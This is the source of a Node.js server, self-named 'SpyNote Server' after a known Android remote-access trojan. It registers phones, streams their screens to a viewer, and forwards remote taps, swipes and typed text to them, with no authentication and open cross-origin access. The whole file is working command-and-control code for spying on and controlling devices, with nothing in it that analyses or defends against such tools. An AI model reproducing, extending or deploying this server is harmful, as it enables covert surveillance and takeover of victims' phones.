const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 10000,
    pingInterval: 5000,
    transports: ['websocket']
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status, width, height } = req.body;
    if (deviceId) {
        devices.set(deviceId, { 
            model, brand, version, status, 
            connected: true, streaming: false,
            width: width || 1080, height: height || 1920
        });
        console.log("✅ Device registered:", deviceId, `${width}x${height}`);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.delete('/unregister/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    if (devices.has(deviceId)) {
        devices.delete(deviceId);
        console.log("✅ Device unregistered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                streaming: false,
                socketId: socket.id 
            });
            socket.join(deviceId);
            console.log("📱 Device joined room:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // ✅ FIXED: Perfect screen frame handling
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId) && devices.get(deviceId).streaming) {
            // ✅ Include width/height for proper scaling
            const frameData = {
                deviceId,
                data: data.data,
                width: data.width || devices.get(deviceId).width,
                height: data.height || devices.get(deviceId).height,
                timestamp: data.timestamp
            };
            socket.to(deviceId).emit('screen-update', frameData);
        }
    });

    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, text } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0,
                text: text || ''
            });
            console.log('🎮 Control:', action, 'to', deviceId);
        }
    });

    // ✅ NEW: Toggle streaming control
    socket.on('toggle-stream', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            device.streaming = !device.streaming;
            devices.set(deviceId, device);
            
            console.log(`📡 ${device.streaming ? 'STARTED' : 'STOPPED'} streaming for`, deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            
            socket.to(deviceId).emit('toggle-streaming', { streaming: device.streaming });
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false, streaming: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server running on port ${PORT}`);
    console.log(`📱 Open http://localhost:${PORT}`);
});
